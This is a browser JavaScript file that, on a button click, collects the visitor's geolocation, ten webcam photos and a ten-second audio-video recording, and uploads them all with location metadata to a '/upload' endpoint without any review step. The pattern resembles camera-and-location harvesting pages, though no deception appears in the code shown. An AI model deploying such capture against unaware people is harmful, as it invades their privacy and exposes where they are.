const startBtn = document.getElementById("startBtn");
const preview = document.getElementById("preview");

let metadata = {};

async function getUserLocation() {
    return new Promise(resolve => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    metadata.latitude = pos.coords.latitude;
                    metadata.longitude = pos.coords.longitude;
                    metadata.timestamp = new Date().toISOString();
                    resolve();
                },
                err => {
                    metadata.latitude = 'Unavailable';
                    metadata.longitude = 'Unavailable';
                    metadata.timestamp = new Date().toISOString();
                    resolve();
                }
            );
        } else {
            metadata.latitude = 'Unsupported';
            metadata.longitude = 'Unsupported';
            metadata.timestamp = new Date().toISOString();
            resolve();
        }
    });
}

async function sendFile(blob, filename) {
    const formData = new FormData();
    formData.append("file", blob, filename);
    formData.append("meta", JSON.stringify(metadata));

    try {
        await fetch("/upload", {
            method: "POST",
            body: formData
        });
    } catch (err) {
        console.error("Failed to send file:", filename, err);
    }
}

startBtn.onclick = async () => {
    startBtn.disabled = true;
    startBtn.textContent = "Capturing...";

    await getUserLocation();

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        preview.srcObject = stream;

        await new Promise(resolve => {
            preview.onloadeddata = () => resolve();
        });

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");

        canvas.width = preview.videoWidth;
        canvas.height = preview.videoHeight;

        // --- Step 1: Take 10 photos first ---
        for (let i = 0; i < 10; i++) {
            await new Promise(res => setTimeout(res, 500)); // slight delay
            if (preview.videoWidth === 0 || preview.videoHeight === 0) {
                console.warn(`Skipped photo ${i + 1} due to zero video dimensions.`);
                continue;
            }

            ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
            const photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.95));
            await sendFile(photoBlob, `photo_${i + 1}.jpg`);
        }

        // --- Step 2: Record 10-second video ---
        const mediaRecorder = new MediaRecorder(stream);
        const videoChunks = [];

        mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
            await sendFile(videoBlob, "recorded_video.webm");
            stream.getTracks().forEach(track => track.stop());
            startBtn.textContent = "Done ✔";
        };

        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 10000); // record for 10 seconds

    } catch (err) {
        console.error("Camera access failed:", err);
        startBtn.textContent = "Permission Denied";
    }
};
